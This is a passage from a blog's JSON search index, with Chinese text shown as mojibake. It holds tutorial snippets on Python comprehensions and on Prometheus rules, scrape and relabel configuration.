1)} ","date":"2020-09-05 16:12","objectID":"/post/1974/:3:0","tags":["python"],"title":"python-ä¸‰å…ƒè¡¨è¾¾å¼ã€åˆ—è¡¨å­—å…¸é›†åˆæ¨å¯¼å¼ã€ç”Ÿæˆå™¨è¡¨è¾¾å¼","uri":"/post/1974/"},{"categories":["python"],"content":"4.å­—å…¸æ¨å¯¼å¼ nums = {i + 1: i for i in range(0, 10)} print(nums) {1: 0, 2: 1, 3: 2, 4: 3, 5: 4, 6: 5, 7: 6, 8: 7, 9: 8, 10: 9} nums = {i + 1: i for i in range(0, 10) if i \u003e 5} print(nums) {7: 6, 8: 7, 9: 8, 10: 9} ","date":"2020-09-05 16:12","objectID":"/post/1974/:4:0","tags":["python"],"title":"python-ä¸‰å…ƒè¡¨è¾¾å¼ã€åˆ—è¡¨å­—å…¸é›†åˆæ¨å¯¼å¼ã€ç”Ÿæˆå™¨è¡¨è¾¾å¼","uri":"/post/1974/"},{"categories":["python"],"content":"5. ç”Ÿæˆå™¨è¡¨è¾¾å¼ ä½¿ç”¨æ‹¬å·è¡¨ç¤ºï¼Œç»“æœè¿”å›ä¸€ä¸ªç”Ÿæˆå™¨å¯¹è±¡ nums = (i for i in range(0, 100)) print(nums) \u003cgenerator object \u003cgenexpr\u003e at 0x10a90af68\u003e ","date":"2020-09-05 16:12","objectID":"/post/1974/:5:0","tags":["python"],"title":"python-ä¸‰å…ƒè¡¨è¾¾å¼ã€åˆ—è¡¨å­—å…¸é›†åˆæ¨å¯¼å¼ã€ç”Ÿæˆå™¨è¡¨è¾¾å¼","uri":"/post/1974/"},{"categories":["ç›‘æ§"],"content":"Prometheusæ”¯æŒä¸¤ç§å¯ä»¥é…ç½®çš„è§„åˆ™ï¼Œè®°å½•è§„åˆ™å’Œå‘Šè­¦è§„åˆ™,ç„¶åå®šæœŸè¯„ä¼°.è¦åˆ›å»ºè§„åˆ™éœ€è¦é€šè¿‡åŠ è½½æ–‡ä»¶çš„æ–¹å¼,é€šè¿‡glogbalä¸­rule_fileså­—æ®µæ¥é…ç½®ã€‚ æ£€æŸ¥è§„åˆ™çš„å‘½ä»¤ promtool check rules /path/to/example.rules.yml ","date":"2020-09-02 12:37","objectID":"/post/1971/:0:0","tags":["prometheus"],"title":"prometheus-é…ç½®æ–‡ä»¶-rules(ä¸‰)","uri":"/post/1971/"},{"categories":["ç›‘æ§"],"content":"ä¸€ã€è®°å½•è§„åˆ™ è®°å½•è§„åˆ™ä½¿æ‚¨å¯ä»¥é¢„å…ˆè®¡ç®—ç»å¸¸éœ€è¦çš„æˆ–è®¡ç®—ä»£ä»·è¾ƒé«˜çš„è¡¨è¾¾å¼,å¹¶å°†å…¶ç»“æœä¿å­˜ä¸ºä¸€ç»„æ–°çš„æ—¶é—´åºåˆ—ã€‚æŸ¥è¯¢é¢„å…ˆè®¡ç®—çš„ç»“æœé€šå¸¸æ¯”æ¯æ¬¡éƒ½ç”¨åŸå§‹è¡¨è¾¾å¼æŸ¥è¯¢è¦å¿«å¾—å¤šã€‚è¿™å¯¹äºä»ªè¡¨æ¿ç‰¹åˆ«æœ‰ç”¨ï¼Œä»ªè¡¨æ¿æ¯æ¬¡åˆ·æ–°æ—¶éƒ½éœ€è¦é‡å¤æŸ¥è¯¢ç›¸åŒçš„è¡¨è¾¾å¼ã€‚ è§„åˆ™éƒ½å­˜åœ¨äºè§„åˆ™ç»„,ç»„å†…çš„è§„åˆ™ä¼šå®šæœŸè¿è¡Œã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªé…ç½®ç¤ºä¾‹ï¼š groups: # æŒ‡å®šè§„åˆ™ç»„çš„åç§° - name: node_rules # è¿è¡Œé—´éš”,é»˜è®¤ç»§æ‰¿å…¨å±€é…ç½®`evaluate_interval` interval: 10s rules: # æ–°çš„æ—¶é—´åºåˆ—å‘½åç§° - record: job:http_inprogress_requests:sum # åŸå§‹promql expr: sum by (job) (http_inprogress_requests) - record: instance:node_cpu:avg_rate5m expr: 100 - avg(irate(node_cpu_seconds_total{job=~\".*node_exporter\",mode=\"idle\"}[5m])) by (instance) * 100 ** recordï¼šæ–°çš„æ—¶é—´åºåˆ—åç§°æ¨èçš„å‘½åè§„èŒƒ: ** level:metric:operations ç¬¬ä¸€éƒ¨åˆ†æ˜¯èšåˆçº§åˆ«(æˆ–è€…èšåˆçš„ç»´åº¦),ç¬¬äºŒéƒ¨åˆ†æ˜¯metricæŒ‡æ ‡åç§°,ç¬¬ä¸‰éƒ¨åˆ†æ˜¯æ“ä½œ æ–°çš„æŒ‡æ ‡æ˜¯å¯ä»¥è¢«å¤ç”¨çš„ï¼š 54041-8f03rjgt46g.png ","date":"2020-09-02 12:37","objectID":"/post/1971/:1:0","tags":["prometheus"],"title":"prometheus-é…ç½®æ–‡ä»¶-rules(ä¸‰)","uri":"/post/1971/"},{"categories":["ç›‘æ§"],"content":"äºŒã€å‘Šè­¦è§„åˆ™ è­¦æŠ¥è§„åˆ™åœ¨Prometheusä¸­çš„é…ç½®æ–¹å¼ä¸è®°å½•è§„åˆ™ç›¸åŒã€‚ ","date":"2020-09-02 12:37","objectID":"/post/1971/:2:0","tags":["prometheus"],"title":"prometheus-é…ç½®æ–‡ä»¶-rules(ä¸‰)","uri":"/post/1971/"},{"categories":["ç›‘æ§"],"content":"é…ç½®ç¤ºä¾‹: groups: # è§„åˆ™ç»„åç§° - name: example rules: # å‘Šè­¦åç§° - alert: load5è´Ÿè½½é«˜äº5 # å‘Šè­¦è§„åˆ™ expr: node_load5 \u003e 5 # è¯„ä¼°ç­‰å¾…æ—¶é—´,å¯é€‰å‚æ•°ã€‚è¡¨ç¤ºåªæœ‰å½“è§¦å‘æ¡ä»¶æŒç»­ä¸€æ®µæ—¶é—´åæ‰å‘é€å‘Šè­¦ã€‚åœ¨ç­‰å¾…æœŸé—´æ–°äº§ç”Ÿå‘Šè­¦çš„çŠ¶æ€ä¸ºpendingã€‚ for: 10m # ç»™æŠ¥è­¦æ·»åŠ æ ‡ç­¾,å¯ä»¥æ¨¡æ¿åŒ– labels: severity: critical # å‘Šè­¦æè¿°ä¿¡æ¯,å¯ä»¥æ¨¡ç‰ˆåŒ– annotations: summary: load5è´Ÿè½½é«˜äº5 ","date":"2020-09-02 12:37","objectID":"/post/1971/:2:1","tags":["prometheus"],"title":"prometheus-é…ç½®æ–‡ä»¶-rules(ä¸‰)","uri":"/post/1971/"},{"categories":["ç›‘æ§"],"content":"æ¨¡ç‰ˆåŒ– æ ‡ç­¾å’Œæ³¨é‡Šå€¼å¯ä»¥ä½¿ç”¨æ§åˆ¶å°æ¨¡æ¿è¿›è¡Œæ¨¡æ¿åŒ–ã€‚$labelså˜é‡ä¿å­˜ä¸€ä¸ªè­¦å‘Šå®ä¾‹çš„æ ‡ç­¾é”®/å€¼å¯¹ã€‚é…ç½®çš„å¤–éƒ¨æ ‡ç­¾å¯ä»¥é€šè¿‡$externalLabelså˜é‡è®¿é—®ã€‚$valueå˜é‡ä¿å­˜å‘Šè­¦å®ä¾‹çš„è¯„ä¼°å€¼ã€‚ ç¤ºä¾‹: groups: - name: example rules: ï¼ƒå¯¹ä»»ä½•è¶…è¿‡5åˆ†é’Ÿæ— æ³•è®¿é—®çš„å®ä¾‹å‘å‡ºå‘Šè­¦ - alert: å®ä¾‹æ— æ³•è®¿é—® expr: up == 0 for: 5m labels: severity: critical annotations: summary: \"å®ä¾‹ {{ $labels.instance }} æ— æ³•è®¿é—®\" description: \"job{{ $labels.job }}çš„{{ $labels.instance }}å®ä¾‹å·²ç»å…³é—­5åˆ†é’Ÿä»¥ä¸Š\" ","date":"2020-09-02 12:37","objectID":"/post/1971/:2:2","tags":["prometheus"],"title":"prometheus-é…ç½®æ–‡ä»¶-rules(ä¸‰)","uri":"/post/1971/"},{"categories":["ç›‘æ§"],"content":"æœ¬ç¯‡ä¸»è¦ä»‹ç»æŠ“å–æŒ‡æ ‡ç›¸å…³é…ç½®ï¼š target: è¦æŠ“å–çš„ç›®æ ‡\u003chost\u003e:\u003cport\u003e metrics: æŒ‡æ ‡æ•°æ® ","date":"2020-09-01 10:55","objectID":"/post/1965/:0:0","tags":["prometheus"],"title":"prometheus-é…ç½®æ–‡ä»¶-scrape_configsã€relabel_configç­‰æŠ“å–ç›¸å…³é…ç½®(äºŒ)","uri":"/post/1965/"},{"categories":["ç›‘æ§"],"content":"1.static_configs: # é™æ€é…ç½® static_configs: # æŒ‡å®šè¦æŠ“å–çš„ç›®æ ‡åœ°å€ - targets: ['localhost:9090', 'localhost:9191'] # ç»™æŠ“å–å‡ºæ¥çš„æ‰€æœ‰æŒ‡æ ‡æ·»åŠ æŒ‡å®šçš„æ ‡ç­¾ labels: my: label your: label ","date":"2020-09-01 10:55","objectID":"/post/1965/:1:0","tags":["prometheus"],"title":"prometheus-é…ç½®æ–‡ä»¶-scrape_configsã€relabel_configç­‰æŠ“å–ç›¸å…³é…ç½®(äºŒ)","uri":"/post/1965/"},{"categories":["ç›‘æ§"],"content":"2.file_sd_configs: åŸºäºæ–‡ä»¶çš„è‡ªåŠ¨å‘ç°,prometheusä¼šå®šæœŸè¯»å–æ–‡ä»¶ä¸­çš„é…ç½®å¹¶é‡æ–°åŠ è½½ï¼Œæ–‡ä»¶å¯ä»¥æ˜¯ymlã€yamlå’Œjsonæ ¼å¼çš„ã€‚ æ¯ä¸ªtargetåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­éƒ½æœ‰ä¸€ä¸ªå…ƒæ ‡ç­¾__meta_filepathä¸ºæ–‡ä»¶çš„è·¯å¾„ã€‚ # æ–‡ä»¶è‡ªåŠ¨å‘ç° file_sd_configs: - files: - foo/*.slow.json - foo/*.slow.yml - single/file.yml # é‡æ–°è¯»å–æ–‡ä»¶çš„é—´éš”,é»˜è®¤5m refresh_interval: 10m - files: - bar/*.yaml jsonæ–‡ä»¶çš„æ ¼å¼ï¼š [ { # é…ç½®æŠ“å–ç›®æ ‡ \"targets\": [ \"http://s1.soulchild.cn\", \"http://s2.soulchild.cn\" ], # æ·»åŠ æ ‡ç­¾ \"labels\": { \"env\": \"test\", \"service\": \"app\" } }, { \"targets\": [ \"http://pc.soulchild.cn\" ], \"labels\": { \"env\": \"dev\", \"service\": \"pc\" } }, { \"targets\": [ \"https://soulchild.cn\" ], \"labels\": { \"project\": \"soulchild\", \"env\": \"prod\", \"service\": \"blog\" } } ] yamlæ–‡ä»¶çš„æ ¼å¼ï¼š - targets: - http://s1.soulchild.cn - http://s2.soulchild.cn labels: env: test service: app - targets: - http://pc.soulchild.cn labels: env: dev service: pc - targets: - https://soulchild.cn labels: project: soulchild env: prod service: blog ","date":"2020-09-01 10:55","objectID":"/post/1965/:2:0","tags":["prometheus"],"title":"prometheus-é…ç½®æ–‡ä»¶-scrape_configsã€relabel_configç­‰æŠ“å–ç›¸å…³é…ç½®(äºŒ)","uri":"/post/1965/"},{"categories":["ç›‘æ§"],"content":"3.relabel_configs: relabelæ˜¯åŠŸèƒ½å¼ºå¤§çš„å·¥å…·ï¼Œå¯ä»¥åœ¨targetè¢«æŠ“å–ä¹‹å‰åŠ¨æ€é‡å†™ç›®æ ‡çš„æ ‡ç­¾é›†ã€‚æ¯ä¸ªscrapeå¯ä»¥é…ç½®å¤šä¸ªrelabel,å¯¹ä¸åŒçš„æ ‡ç­¾è¿›è¡Œä¸åŒçš„æ“ä½œã€‚relableçš„è¿‡ç¨‹å¯ä»¥åˆ†ä¸ºï¼šrelabelä¹‹å‰,relabelæœŸé—´,relabelä¹‹åã€‚relabel_configsä¸èƒ½æ“ä½œæŒ‡æ ‡ä¸­çš„æ ‡ç­¾ï¼Œåªèƒ½æ“ä½œrelabelä¹‹å‰çš„æ ‡ç­¾ã€‚å³__å¼€å¤´çš„å’Œjobè¿™äº› relabelä¹‹å‰,é™¤äº†è‡ªå®šä¹‰çš„æ ‡ç­¾å¤–ï¼Œè¿˜æœ‰ä¸€äº›å…¶ä»–çš„æ ‡ç­¾ï¼š job,è¿™ä¸ªæ ‡ç­¾çš„å€¼æ˜¯é…ç½®æ–‡ä»¶ä¸­job_nameé…ç½®çš„å€¼ __address__è¿™ä¸ªæ ‡ç­¾çš„å€¼æ˜¯è¦æŠ“å–çš„åœ°å€å’Œç«¯å£\u003chost\u003e:\u003cport\u003e instanceè¿™ä¸ªæ ‡ç­¾ï¼Œåœ¨relabelä¹‹å‰æ˜¯æ²¡æœ‰çš„ï¼Œå¦‚æœrelabelæœŸé—´ä¹Ÿæ²¡æœ‰è®¾ç½®instanceæ ‡ç­¾,é»˜è®¤æƒ…å†µä¸‹instanceæ ‡ç­¾çš„å€¼å°±æ˜¯__address__çš„å†…å®¹ __scheme__:httpæˆ–https __metrics_path__: metricsçš„è·¯å¾„ __param_\u003cname\u003e: httpè¯·æ±‚å‚æ•°,\u003cname\u003eå°±æ˜¯å‚æ•°å 1.ä»¥__å¼€å¤´çš„æ ‡ç­¾ä¼šåœ¨relabelå®Œæˆåï¼Œä»æ ‡ç­¾é›†ä¸­åˆ é™¤ 2.å¦‚æœrelabelæœŸé—´éœ€è¦ä¸´æ—¶çš„æ ‡ç­¾,å¯ä»¥ä½¿ç”¨__tmpå‰ç¼€,è¿™ä¸ªæ ‡ç­¾ä¸ä¼šè¢«prometheusä½¿ç”¨ï¼Œé˜²æ­¢å†²çª ","date":"2020-09-01 10:55","objectID":"/post/1965/:3:0","tags":["prometheus"],"title":"prometheus-é…ç½®æ–‡ä»¶-scrape_configsã€relabel_configç­‰æŠ“å–ç›¸å…³é…ç½®(äºŒ)","uri":"/post/1965/"},{"categories":["ç›‘æ§"],"content":"relabelå¯ä»¥æ‰§è¡Œçš„æ“ä½œï¼š replace: å°†\"target_label\"æŒ‡å®šçš„æ ‡ç­¾çš„å€¼æ›¿æ¢ä¸º\"replacement\"æŒ‡å®šçš„å†…å®¹ keep: åˆ é™¤ä¸æ­£åˆ™ä¸åŒ¹é…çš„ç›®æ ‡ drop: åˆ é™¤ä¸æ­£åˆ™åŒ¹é…çš„ç›®æ ‡ labelmap: å°†æ­£åˆ™ä¸æ‰€æœ‰æ ‡ç­¾çš„\"åç§°\"åŒ¹é…ï¼Œç„¶åç”¨\"replacement\"æŒ‡å®šçš„å†…å®¹æ¥æ›¿æ¢æºæ ‡ç­¾çš„åç§°ï¼Œsource_labelsä¸ç”¨å¡«å†™ã€‚ä¸€èˆ¬ç”¨æ¥å»é™¤æ ‡ç­¾å‰ç¼€è·å¾—ä¸€ä¸ªæ–°çš„æ ‡ç­¾åç§° labeldrop: åˆ é™¤ä¸æ­£åˆ™åŒ¹é…çš„label,labeldropåªéœ€è¦å†™regexå­—æ®µ labelkeep: åˆ é™¤ä¸æ­£åˆ™ä¸åŒ¹é…çš„label,labelkeepåªéœ€è¦å†™regexå­—æ®µ hashmod: è¿™ä¸ªæ²¡çœ‹æ‡‚ ä¸‹é¢å¯ä»¥çœ‹ä¸€ä¸‹é…ç½®çš„æ–¹æ³•ï¼š relabel_configs: # ä»ç°æœ‰çš„æ ‡ç­¾ä¸­æŒ‡å®šæºæ ‡ç­¾(å¯ä»¥æŒ‡å®šå¤šä¸ª),ä¸å†™source_labelsä»£è¡¨æ‰€æœ‰æ ‡ç­¾ - source_labels:[__address__, scrape_port] # å¤šä¸ªæ ‡ç­¾çš„å€¼ä¼šä½¿ç”¨ä»¥ä¸‹åˆ†å‰²ç¬¦è¿æ¥èµ·æ¥,æ­£åˆ™çš„æ—¶å€™éœ€è¦è€ƒè™‘è¿™ä¸ªåˆ†å‰²ç¬¦.é»˜è®¤\";\" separator: ; # ä½¿ç”¨æ­£åˆ™æå–æ•°æ®.å‡å¦‚æºæ ‡ç­¾çš„å†…å®¹æ˜¯\"10.0.0.10:8088;80\",å°±åŒ¹é…åˆ°10.0.0.10ã€8088ã€80è¿™ä¸‰ä¸ªéƒ¨åˆ†ã€‚é»˜è®¤æ­£åˆ™:(.*) regex: (.*?):(\\d+);(\\d+) # æŒ‡å®šè¦å°†ç»“æœå€¼å†™å…¥å“ªä¸ªæ ‡ç­¾ã€‚å¦‚æœå†™ä¸€ä¸ªä¸å­˜åœ¨çš„æ ‡ç­¾ï¼Œç›¸å½“äºæ–°å¢ä¸€ä¸ªæ ‡ç­¾ã€‚ target_label: __address__ # è¦æ›¿æ¢çš„å†…å®¹,é»˜è®¤$1 replacement: $1:$3 # æŒ‡å®šè¦æ‰§è¡Œä»€ä¹ˆæ“ä½œ,é»˜è®¤replace action: replace ############################################ # ç›´æ¥å°†abcæ ‡ç­¾çš„å€¼ç»™cdeæ ‡ç­¾ - source_labels: [abc] # æºæ ‡ç­¾ target_label: cde # ç›®æ ‡æ ‡ç­¾ # å°†staticåšä¸ºabcæ ‡ç­¾çš„å€¼ï¼Œå³abc=static - replacement: static target_label: abc # åŒä¸Š - regex: replacement: static target_label: abc ","date":"2020-09-01 10:55","objectID":"/post/1965/:3:1","tags":["prometheus"],"title":"prometheus-é…ç½®æ–‡ä»¶-scrape_configsã€relabel_configç­‰æŠ“å–ç›¸å…³é…ç½®(äºŒ)","uri":"/post/1965/"},{"categories":["ç›‘æ§"],"content":"4. metric_relabel_configs: è¿™ä¸ªé…ç½®çš„æ“ä½œæ˜¯åœ¨æŠ“å–æŒ‡æ ‡ä¹‹å,å­˜å‚¨æ•°æ®ä¹‹å‰ï¼Œæ‰€ä»¥ä½ å¯ä»¥åœ¨å­˜å‚¨æ•°æ®ä¹‹å‰åˆ é™¤æŒ‡æ ‡ã€åˆ é™¤å’Œé‡å†™æŒ‡æ ‡çš„æ ‡ç­¾ã€‚ é…ç½®çš„æ–¹æ³•å’Œä¸Šé¢çš„relabel_configsæ˜¯ä¸€æ ·çš„ã€‚ è¿™é‡Œä¼šæ¶‰åŠåˆ°ä¸€ä¸ªæ–°çš„é¢„ç•™æ ‡ç­¾__name__,è¿™ä¸ªæ ‡ç­¾çš„å€¼å°±æ˜¯æŒ‡æ ‡åç§°ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡ä¿®æ”¹åŒ¹é…è¿™ä¸ªæ ‡ç­¾å°±å¯ä»¥å¯¹æŒ‡æ ‡è¿›è¡Œæ“ä½œäº†ã€‚ ","date":"2020-09-01 10:55","objectID":"/post/1965/:4:0","tags":["prometheus"],"title":"prometheus-é…ç½®æ–‡ä»¶-scrape_configsã€relabel_configç­‰æŠ“å–ç›¸å…³é…ç½®(äºŒ)","uri":"/post/1965/"},{"categories":["ç›‘æ§"],"content":"5.ä¸‹é¢ç»“åˆä¸Šé¢è¯´åˆ°çš„åšä¸€äº›é…ç½®ç¤ºä¾‹ï¼š ","date":"2020-09-01 10:55","objectID":"/post/1965/:5:0","tags":["prometheus"],"title":"prometheus-é…ç½®æ–‡ä»¶-scrape_configsã€relabel_configç­‰æŠ“å–ç›¸å…³é…ç½®(äºŒ)","uri":"/post/1965/"},{"categories":["ç›‘æ§"],"content":"5.1. è¿™éƒ¨åˆ†åŒ…å«äº†å¤§éƒ¨åˆ†çš„åŸºç¡€é…ç½® # æŠ“å–éƒ¨åˆ†çš„é…ç½® scrape_configs: # job_nameçš„å€¼é»˜è®¤ä¼šåšä¸ºjobæ ‡ç­¾çš„å€¼,job_nameå¯ä»¥é…ç½®å¤šä¸ª - job_name: prometheus # æ¯ä¸ªæŠ“å–è¯·æ±‚ä¸Šæ·»åŠ \"Authorization\"è¯·æ±‚å¤´,ä¸‹é¢ä¸¤ä¸ªäºŒé€‰ä¸€ bearer_token: xxxxxxxxxxxxxxxx bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token # ä½¿ç”¨httpè¿˜æ˜¯https scheme: http # metricsè·¯å¾„ metrics_path: metrics # é˜²æ­¢prometheusé™„åŠ çš„æ ‡ç­¾ã€æ‰‹åŠ¨é…ç½®çš„æ ‡ç­¾ä»¥åŠæœåŠ¡å‘ç°ç”Ÿæˆçš„æ ‡ç­¾ï¼Œå’ŒæŠ“å–æ•°æ®ä¸­çš„æ ‡ç­¾å†²çª. # é»˜è®¤æ˜¯false,å°†æŠ“å–çš„æ•°æ®ä¸­çš„å†²çªæ ‡ç­¾é‡å‘½åä¸º\"exported_\u003coriginal-label\u003e\".å¦‚æœè®¾ç½®ä¸ºtrue,åˆ™ä¿ç•™æŠ“å–æ•°æ®ä¸­çš„æ ‡ç­¾ honor_labels: true # å½“Prometheusè”åˆ(è”é‚¦)å¦ä¸€ä¸ªç›‘æ§ç³»ç»Ÿæ—¶ï¼Œå¯èƒ½æ˜¯è¯¥ç›‘æ§ç³»ç»Ÿæš´éœ²äº†æ—¶é—´æˆ³ã€‚å¯¹äºå¸¦æœ‰æ—¶é—´æˆ³çš„è”åˆ(è”é‚¦)ï¼Œå¦‚æœæ—¶é—´æˆ³æ¶ˆå¤±ï¼Œåˆ™Prometheusä¸ä¼šå°†æŒ‡æ ‡æ•°æ®æ ‡è®°ä¸º\"stale\"çŠ¶æ€,ç›¸åå®ƒå°†å‡ºç°åœ¨query.loopbackå€¼ä¹‹å‰https://github.com/prometheus/prometheus/issues/5302 # é»˜è®¤true,åˆ™å°†ä½¿ç”¨targetå…¬å¼€çš„æŒ‡æ ‡æ•°æ®çš„æ—¶é—´æˆ³.å¦‚æœè®¾ç½®ä¸º\"false\",åˆ™targetçš„æŒ‡æ ‡æ•°æ®çš„æ—¶é—´æˆ³å°†è¢«å¿½ç•¥ã€‚ honor_timestamps: true # æŠ“å–æ•°æ®çš„é—´éš”(ä¸å†™ç»§æ‰¿global) scrape_interval: 30s # æŠ“å–æ•°æ®çš„è¶…æ—¶æ—¶é—´(ä¸å†™ç»§æ‰¿global) scrape_timeout: 10s # å­˜å‚¨çš„æ•°æ®æ ‡ç­¾ä¸ªæ•°é™åˆ¶ï¼Œå¦‚æœè¶…è¿‡é™åˆ¶ï¼Œè¯¥æ•°æ®å°†è¢«å¿½ç•¥ï¼Œä¸å…¥å­˜å‚¨ï¼›é»˜è®¤å€¼ä¸º0ï¼Œè¡¨ç¤ºæ²¡æœ‰é™åˆ¶ sample_limit: 0 # æ–‡ä»¶è‡ªåŠ¨å‘ç°é…ç½®,targetçš„é…ç½®ä»ä¸‹é¢æŒ‡å®šçš„æ–‡ä»¶ä¸­è¯»å– file_sd_configs: - files: - foo/*.slow.json - foo/*.slow.yml - single/file.yml refresh_interval: 10m - files: - bar/*.yaml # targeté™æ€é…ç½®,ä»ä¸‹é¢æŒ‡å®šçš„ç›®æ ‡ä¸­æŠ“å–æ•°æ® static_configs: - targets: ['localhost:9090', 'localhost:9191'] # æ·»åŠ é¢å¤–çš„æ ‡ç­¾ labels: my: label your: label # é‡æ–°æ ‡ç­¾ relabel_configs: # æ•´æ®µå«ä¹‰æ˜¯ä½¿ç”¨\"(.*)some-[regex]\"åŒ¹é…æºæ ‡ç­¾ä¸­çš„å†…å®¹ï¼Œå¹¶å°†jobè¿™ä¸ªæ ‡ç­¾çš„å€¼=foo-${1},$1å°±æ˜¯åŒ¹é…åˆ°çš„å†…å®¹ - source_labels: [job, __meta_dns_name] regex: (.*)some-[regex] target_label: job replacement: foo-${1} # ç›´æ¥å°†abcæ ‡ç­¾çš„å€¼ç»™cdeæ ‡ç­¾ - source_labels: [abc] # æºæ ‡ç­¾ target_label: cde # ç›®æ ‡æ ‡ç­¾ # å°†staticåšä¸ºabcæ ‡ç­¾çš„å€¼ï¼Œå³abc=static - replacement: static target_label: abc # åŒä¸Š - regex: replacement: static target_label: abc ","date":"2020-09-01 10:55","objectID":"/post/1965/:5:1","tags":["prometheus"],"title":"prometheus-é…ç½®æ–‡ä»¶-scrape_configsã€relabel_configç­‰æŠ“å–ç›¸å…³é…ç½®(äºŒ)","uri":"/post/1965/"},{"categories":["ç›‘æ§"],"content":"5.2 å½“æŠ“å–çš„httpè¯·æ±‚éœ€è¦å‚æ•°å’Œbasicè®¤è¯æ—¶ - job_name: 'param_test' # å¦‚æœæŠ“å–æŒ‡æ ‡çš„urléœ€è¦basicè®¤è¯åˆ™ä½¿ç”¨ä¸‹é¢çš„æ–¹å¼é…ç½® basic_auth: username: admin_name password: \"multiline\\nmysecret\\ntest\" # è¿™é‡ŒæŒ‡å®šæŠ“å–è·¯å¾„ metrics_path: /probe # æŒ‡å®šhttpè¯·æ±‚å‚æ•°,ç›¸å½“äºhttp://192.168.0.200:9115/probe?target=https://soulchild.cn\u0026module=http_2xx params: target: [\"https://soulchild.cn\"] module: [http_2xx] # æŠ“å–ç›®æ ‡å’Œé‡æ–°æ ‡ç­¾ã€‚ã€‚ã€‚ã€‚ã€‚ static_configs: - targets: [\"192.168.0.200:9115\"] relabel_configs: - source_labels: [__param_target] target_label: instance ","date":"2020-09-01 10:55","objectID":"/post/1965/:5:2","tags":["prometheus"],"title":"prometheus-é…ç½®æ–‡ä»¶-scrape_configsã€relabel_configç­‰æŠ“å–ç›¸å…³é…ç½®(äºŒ)","uri":"/post/1965/"},{"categories":["ç›‘æ§"],"content":"5.3 åŸºäºconsulè‡ªåŠ¨å‘ç°é…ç½® - job_name: service-y consul_sd_configs: - server: 'localhost:1234' token: mysecret services: ['nginx', 'cache', 'mysql'] tags: [\"canary\", \"v1\"] node_meta: rack: \"123\" allow_stale: true scheme: https tls_config: ca_file: valid_ca_file cert_file: valid_cert_file key_file: valid_key_file insecure_skip_verify: false relabel_configs: - source_labels: [__meta_sd_consul_tags] separator: ',' regex: label:([^=]+)=([^,]+) target_label: ${1} replacement: ${2} ","date":"2020-09-01 10:55","objectID":"/post/1965/:5:3","tags":["prometheus"],"title":"prometheus-é…ç½®æ–‡ä»¶-scrape_configsã€relabel_configç­‰æŠ“å–ç›¸å…³é…ç½®(äºŒ)","uri":"/post/1965/"},{"categories":["ç›‘æ§"],"content":"5.4 åˆ é™¤ä¸éœ€è¦çš„æŒ‡æ ‡ - job_name: node_exporter static_configs: - targets: ['10.0.0.2:9100'] labels: instance: \"db01\" # åˆ é™¤node_netstat_Icmp6_InErrorså’Œnode_netstat_Icmp6_InMsgsæŒ‡æ ‡ metric_relabel_configs: - source_labels: [__name__] regex: \"(node_netstat_Icmp6_InErrors|node_netstat_Icmp6_InMsgs)\" action: drop ","date":"2020-09-01 10:55","objectID":"/post/1965/:5:4","tags":["prometheus"],"title":"prometheus-é…ç½®æ–‡ä»¶-scrape_configsã€relabel_configç­‰æŠ“å–ç›¸å…³é…ç½®(äºŒ)","uri":"/post/1965/"},{"categories":["ç›‘æ§"],"content":"5.5 æ›¿æ¢æ ‡ç­¾çš„å€¼ container_id = docker://8bfaa038763215a732dea54ebe8bd8eeb48e2bed88c05f0ec52c00b27214e3c4 å°†kube_pod_container_infoè¿™ä¸ªæŒ‡æ ‡çš„container_idæ ‡ç­¾ä¸­idçš„å‰8ä½å–å‡ºæ¥ï¼Œå¹¶æ›¿æ¢è‡³container_idæ ‡ç­¾ - job_name: kubernetes-service-endpoints kubernetes_sd_configs: - role: endpoints metric_relabel_configs: - source_labels: [__name__, container_id] separator: ; regex: kube_pod_container_info;docker://([a-z0-9]{8}) target_label: container_id replacement: $1 action: replace ","date":"2020-09-01 10:55","objectID":"/post/1965/:5:5","tags":["prometheus"],"title":"prometheus-é…ç½®æ–‡ä»¶-scrape_configsã€relabel_configç­‰æŠ“å–ç›¸å…³é…ç½®(äºŒ)","uri":"/post/1965/"},{"categories":["ç›‘æ§"],"content":"5.6 åˆ é™¤ä¸éœ€è¦çš„æ ‡ç­¾ åˆ é™¤kernelVersionè¿™ä¸ªæ ‡ç­¾.labeldropåªéœ€è¦å†™regexå­—æ®µ - job_name: kubernetes-cadvisor kubernetes_sd_configs: - role: node bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token tls_config: ca_file: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt insecure_skip_verify: true metric_relabel_configs: - regex: kernelVersion action: labeldrop ","date":"2020-09-01 10:55","objectID":"/post/1965/:5:6","tags":["prometheus"],"title":"prometheus-é…ç½®æ–‡ä»¶-scrape_configsã€relabel_configç­‰æŠ“å–ç›¸å…³é…ç½®(äºŒ)","uri":"/post/1965/"},{"categories":["ç›‘æ§"],"content":"ä¸€ã€global(å…¨å±€é…ç½®) global: # æŠ“å–æŒ‡æ ‡çš„é—´éš”,é»˜è®¤1m scrape_interval: 15s # æŠ“å–æŒ‡æ ‡çš„è¶…æ—¶æ—¶é—´,é»˜è®¤10s scrape_timeout: 10s # æŒ‡å®šPrometheusè¯„ä¼°è§„åˆ™çš„é¢‘ç‡[è®°å½•è§„åˆ™(record)å’Œå‘Šè­¦è§„åˆ™(alert)],é»˜è®¤1m. # å¯ä»¥ç†è§£ä¸ºæ‰§è¡Œè§„åˆ™çš„æ—¶é—´é—´éš” evaluation_interval: 30s # ç”¨äºåŒºåˆ†ä¸åŒçš„prometheus external_labels: prometheus: test # PromQLæŸ¥è¯¢è®°å½•æ—¥å¿—æ–‡ä»¶ã€‚é‡æ–°åŠ è½½é…ç½®ä¼šé‡æ–°æ‰“å¼€æ–‡ä»¶ã€‚ query_log_file: /tmp/query.log ","date":"2020-08-31 17:54","objectID":"/post/1963/:1:0","tags":["prometheus"],"title":"prometheus-é…ç½®æ–‡ä»¶-globalã€rule_filesã€remote_read|write(ä¸€)","uri":"/post/1963/"},{"categories":["ç›‘æ§"],"content":"äºŒã€rule_files(è§„åˆ™é…ç½®) è¿™é‡Œä»‹ç»ä¸€ä¸‹prometheusæ”¯æŒçš„ä¸¤ç§è§„åˆ™ï¼š è®°å½•è§„åˆ™(recording 